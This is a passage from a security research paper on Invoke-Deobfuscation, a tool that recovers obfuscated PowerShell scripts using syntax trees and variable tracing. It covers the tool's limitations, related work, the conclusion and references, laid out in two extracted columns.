+   Because Li et al. can only deal with the obfuscation on                                                 scripts mentioned in Section IV-C2 on a virtual machine,
+the PipelineAst nodes, so they cannot process the string                                                   and analyze the final scripts captured by AMSI. Our analysis
+reordering obfuscation in the first line. Due to the lack of                                               shows that Invoke-Deobfuscation has similar deobfuscation
+context, they also cannot process the obfuscation in the fourth                                            abilities to AMSI as mentioned in section III-B4. Besides,
+
+
+
+                                                                                                      10
+Invoke-Deobfuscation is robust enough to deal with different             C. Deobfuscation Techniques
+obfuscation techniques.                                                  Common deobfuscation techniques can be divided into two
+                                                                         types: dynamic analysis and static analysis. Dynamic analysis
+C. Limitation                                                            often executes samples in an isolated environment and mon-
+Variable Tracing. The variable tracing module of Invoke-                 itors their behavior [45]–[47]. It only can infer the script’s
+Deobfuscation is not perfect. Firstly, when the variable assign-         intent from its behavior and has low code coverage. Static
+ment is in a conditional statement, we abandon recording the             analysis needs to identify obfuscated data and the correspond-
+variable value. The reason is that the variable value is based           ing recovery algorithm, which is usually very difficult. Regex
+on specified criteria, which may change at different run-time.           expression based tools, such as PSDecode [16], PowerDrive
+Secondly, we give up recording the variable whose assignment             [17], PowerDecode [18], etc., ignore the syntax of script pieces
+is in a loop statement. We cannot determine the variable value           so that they cannot identify obfuscation pieces precisely. Li
+by executing the assignment script piece once. To execute                et al. [19] identify obfuscated script pieces using a machine
+the whole loop statement for obtaining the variable value is             learning based classifier and AST features. However, due to
+an uncontrollable process for us. It involves many unrelated             lacking context and wrong replacement, their tool approach
+script pieces and may be an endless loop. Therefore, we do               often encounters syntax errors and semantics inconsistency.
+not record this type of variable currently.                              Invoke-Deobfuscation utilizes recoverable nodes on AST to
+Complex Obfuscation. Most obfuscated data and their cor-                 identify obfuscated pieces and implements variable tracing to
+responding recovery algorithms are in the same obfuscated                mitigate the challenge above.
+script pieces. Therefore, identifying these obfuscated pieces
+and executing them with the correct context can recover                                            VII. C ONCLUSION
+the original script pieces. Even though they are in different            In this paper, we propose Invoke-Deobfuscation, the first AST-
+positions, we can handle them with variable tracing. However,            based and semantics-preserving PowerShell script deobfusca-
+if attackers put the recovery algorithm into function and utilize        tion tool with variable tracing. Invoke-Deobfuscation uses the
+function calls to recover the obfuscated data, our approach              tokens and recoverable nodes of AST to identify obfuscated
+hardly traces the obfuscated chain. Even attackers can use               script pieces precisely, traces the value and scope of variables
+function nesting against analysis.                                       and simulates the execution of obfuscated script pieces to get
+                                                                         correct recovery results. To keep the original semantics of the
+                    VI. R ELATED W ORK                                   script, Invoke-Deobfuscation strictly processes replacement in
+                                                                         place. Our evaluation demonstrates that Invoke-Deobfuscation
+A. Detection of Malicious Script
+                                                                         outperforms the state-of-the-art tools in dealing with various
+Recently, many machine learning or deep learning based                   obfuscation techniques, deobfuscation effectiveness, keeping
+malicious script detection models have been proposed. These              scripts’ semantics, and mitigating obfuscation of wild sam-
+models classify malicious samples based on different features,           ples. The amount of key information recovered by Invoke-
+such as textual [8], [26], [27], token and AST node features             Deobfuscation is more than twice that of other tools and 100%
+[9], [10]. Because obfuscation can easily change these features,         of deobfuscation results of Invoke-Deobfuscation have the
+some researchers propose to detect obfuscated scripts [34]–              same behavior as the original samples. Furthermore, Invoke-
+[36]. However, there is no direct correlation between obfus-             Deobfuscation can reduce the obfuscation score of the wild
+cated scripts and malicious scripts. Therefore, it is hard for           samples by 46%.
+existing detection approaches to accurately detect obfuscated
+malicious PowerShell scripts.                                                                    ACKNOWLEDGMENTS
+                                                                         We thank anonymous reviewers for their insightful comments.
+B. Obfuscation Techniques                                                We also thank the members of Qi-ANXIN StarMap team for
+Obfuscation for Binary. Attackers often use run-time packers             their help.
+to obfuscate their malicious code and hinder static analysis
+[37], [38]. They hide the code by making it appear as data at                                         R EFERENCES
+compile-time and transform it back at run-time [39]. It is hard           [1] F. O’Connor, “What you need to know about powershell attacks,” https:
+for static analysis to get the real binary code.                              //www.cybereason.com/blog/fileless-malware-powershell.
+                                                                          [2] “Increased use of powershell in attacks,” https://docs.broadcom.com/do
+Obfuscation for Script. Various obfuscation techniques can                    c/increased-use-of-powershell-in-attacks-16-en.
+help malicious scripts to evade the detection of anti-virus               [3] A. J. Pereira, “Tracking, detecting, and thwarting powershell-based
+software [40], [41]. Wang et al. [42] propose a technique                     malware and attacks,” https://www.trendmicro.com/vinfo/br/security/n
+                                                                              ews/cybercrime-and-digital-threats/tracking-detecting-and-thwarting-
+of JavaScript code obfuscation based on control flow trans-                   powershell-based-malware-and-attacks.
+formation. There are many popular obfuscation tools, e.g.,                [4] “Why malicious actors love powershell attacks and how to defend
+Invoke-Obfuscation [12], PowerSploit [43], Empire [44], etc.,                 them,” https://www.rangeforce.com/blog/powershell-attacks-and-how-t
+                                                                              o-defend-them.
+which provide abundant obfuscation techniques as mentioned                [5] “2020 threat detection report,” https://redcanary.com/threat-detection-r
+in section II-B.                                                              eport/techniques/powershell/.
+
+
+
+
+                                                                    11
+ [6] D. Dohannon, “Obfuscatedempire - use an obfuscated, in-memory                     [37] X. Ugarte-Pedrero, D. Balzarotti, I. Santos, and P. G. Bringas, “Sok:
+     powershell c2 channel to evade av signatures,” https://cobbr.io/Obfus                  Deep packer inspection: A longitudinal study of the complexity of run-
+     catedEmpire.html, 2017.                                                                time packers,” in IEEE S&P, 2015.
+ [7] Daniel Dohannon, “Abstract syntax tree-based powershell obfusca-                  [38] F. Guo, P. Ferrie, and T.-C. Chiueh, “A study of the packer problem and
+     tion,” https://cobbr.io/AbstractSyntaxTree-Based-PowerShell-Obfuscati                  its solutions,” in Springer RAID, 2008.
+     on.html, 2017.                                                                    [39] M. I. Sharif, A. Lanzi, J. T. Giffin, and W. Lee, “Impeding malware
+ [8] D. Hendler, S. Kels, and A. Rubin, “Detecting malicious powershell                     analysis using conditional code obfuscation.” in NDSS, 2008.
+     commands using deep neural networks,” in ASIACCS, 2018.                           [40] W. Xu, F. Zhang, and S. Zhu, “The power of obfuscation techniques in
+ [9] G. Rusak, A. Al-Dujaili, and U.-M. O’Reilly, “Ast-based deep learning                  malicious javascript code: A measurement study,” in IEEE MALWARE,
+     for detecting malicious powershell,” in ACM CCS, 2018.                                 2012.
+[10] Y. Fang, X. Zhou, and C. Huang, “Effective method for detecting                   [41] A. Balakrishnan and C. Schulze, “Code obfuscation literature survey,”
+     malicious powershell scripts based on hybrid features,” Neurocomputing,                CS701 Construction of compilers, 2005.
+     2021.                                                                             [42] Z. Y. Wang and W. M. Wu, “Technique of javascript code obfuscation
+[11] Y. Tajiri and M. Mimura, “Detection of malicious powershell using                      based on control flow tansformations,” in AMM, 2014.
+     word-level language models,” in Springer IWSEC, 2020.                             [43] “Powersploit - a powershell post-exploitation framework,” https://github
+                                                                                            .com/PowerShellMafia/PowerSploit.
+[12] D. Bohannon, “Invoke-obfuscation - powershell obfuscator,” https://gith
+                                                                                       [44] “Empire - a powershell and python post-exploitation agent,” https://gith
+     ub.com/danielbohannon/Invoke-Obfuscation.
+                                                                                            ub.com/EmpireProject/Empire.
+[13] “Virustotal,” https://www.virustotal.com/gui/home/upload.
+                                                                                       [45] G. Lu, K. Coogan, and S. Debray, “Automatic simplification of obfus-
+[14] “Antimalware scan interface (amsi),” https://docs.microsoft.com/en-us/w                cated javascript code,” in IEEE ICISTM, 2012.
+     indows/win32/amsi/antimalware-scan-interface-portal.                              [46] B. Feinstein, D. Peck, and I. SecureWorks, “Caffeine monkey: Auto-
+[15] C. Liu, B. Xia, M. Yu, and Y. Liu, “Psdem: A feasible de-obfuscation                   mated collection, detection and analysis of malicious javascript,” Black
+     method for malicious powershell detection,” in IEEE ISCC, 2018.                        Hat USA, 2007.
+[16] “Psdecode - powershell script for deobfuscating encoded powershell                [47] U. Bayer, A. Moser, C. Kruegel, and E. Kirda, “Dynamic analysis of
+     scripts,” https://github.com/R3MRUM/PSDecode.                                          malicious code,” Journal in Computer Virology, 2006.
+[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accu-
+     rate de-obfuscation and analysis of powershell malware,” in Springer
+     DIMVA, 2019.
+[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerde-
+     code: a powershell script decoder dedicated to malware analysis,” in
+     ITASEC, 2021.
+[19] Z. Li, Q. A. Chen, C. Xiong, Y. Chen, T. Zhu, and H. Yang, “Effective
+     and light-weight deobfuscation and semantic-aware attack detection for
+     powershell scripts,” in ACM CCS, 2019.
+[20] “Installing windows powershell,” https://docs.microsoft.com/en-us/pow
+     ershell/scripting/windows-powershell/install/installing-windows-powers
+     hell?view=powershell-7.1.
+[21] “Install powershell on windows, linux, and macos,” https:
+     //docs.microsoft.com/en-us/powershell/scripting/install/installing-p
+     owershell?view=powershell-7.1.
+[22] Praetorian, “Command and scripting interpreter: Powershell,” https://at
+     tack.mitre.org/techniques/T1059/001/.
+[23] McAfee, “Fileless malware execution with powershell is easier than you
+     may realize,” https://www.mcafee.com/enterprise/en-us/assets/solution-
+     briefs/sb-fileless-malware-execution.pdf.
+[24] “About special characters,” https://docs.microsoft.com/en-us/powershel
+     l/module/microsoft.powershell.core/about/about_special_characters?vi
+     ew=powershell-7.1.
+[25] D. Hendler, S. Kels, and A. Rubin, “Amsi-based detection of malicious
+     powershell code using contextual embeddings,” in ACM CCS, 2020.
+[26] Choi, Sunoh, “Malicious powershell detection using attention against
+     adversarial attacks,” Electronics, 2020.
+[27] S. Choi, “Malicious powershell detection using graph convolution net-
+     work,” Applied Sciences, 2021.
+[28] “Simple tokenizer,” https://powershell.one/powershell-internals/parsing-
+     and-tokenization/simple-tokenizer.
+[29] R. E. Hayden, “The relative frequency of phonemes in general-american
+     english,” WORD, 1950.
+[30] J. White, “Pulling back the curtains on encodedcommand power-
+     shell attacks,” https://unit42.paloaltonetworks.com/unit42-pulling-back-
+     the-curtains-on-encodedcommand-powershell-attacks/.
+[31] “Trid - file identifier,” https://mark0.net/soft-trid-e.html.
+[32] “Fine free file command,” http://www.darwinsys.com/file/.
+[33] “Tianqiong sandbox,” https://research.qianxin.com/sandbox.
+[34] D. Bohannon and L. Holmes, “Revoke-obfuscation - powershell obfus-
+     cation detection framework,” https://github.com/danielbohannon/Revoke
+     -Obfuscation.
+[35] S. Aebersold, K. Kryszczuk, S. Paganoni, B. Tellenbach, and T. Trow-
+     bridge, “Detecting obfuscated javascripts using machine learning,” in
+     ICIMP, 2016.
+[36] M. Jodavi, M. Abadi, and E. Parhizkar, “Jsobfusdetector: A binary pso-
+     based one-class classifier ensemble to detect obfuscated javascript code,”
+     in IEEE AISP, 2015.
+
+
+
+
+                                                                                  12
+
